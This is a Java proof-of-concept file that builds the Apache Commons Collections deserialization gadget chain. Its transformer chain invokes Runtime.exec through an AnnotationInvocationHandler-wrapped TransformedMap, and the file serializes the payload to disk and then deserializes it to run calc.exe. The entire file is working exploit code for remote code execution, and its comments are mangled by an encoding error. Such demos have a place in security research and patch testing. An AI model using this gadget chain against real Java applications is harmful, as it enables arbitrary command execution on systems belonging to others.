package ApacheCommonsCollections;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
/*
 * this code from https://github.com/shengqi158
 * ��image.png
 */

public class shenqi158demo {
    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc.exe" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        
        //ͨ��������AnnotationInvocationHandler�����
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //ͨ��������cls�Ĺ��캯��
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //������Ҫ����AccessibleΪtrue���������л�ʧ��
        ctor.setAccessible(true);
        //ͨ��newInstance()����ʵ��������
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(),"obj");
        payloadTest("obj");
    }
    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //������õ�payload���л���д���ļ���
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //��ȡд���payload�������з����л�
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}